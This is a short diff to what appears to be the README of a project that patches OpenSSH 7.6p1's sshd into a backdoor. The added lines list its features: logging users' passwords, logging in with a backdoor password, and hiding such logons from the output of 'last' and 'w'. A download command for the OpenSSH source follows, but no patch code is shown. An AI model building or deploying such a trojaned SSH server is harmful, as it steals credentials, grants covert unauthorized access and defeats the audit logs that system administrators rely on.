@@ -1,4 +1,6 @@
-logon through the patched sshd results in nothing in output from `last` and `w`
+1. password logging
+2. logon using a backdoor password
+3. logon through the patched sshd results in nothing in output from `last` and `w`
 
 #### donwload package
 wget https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.6p1.tar.gz   
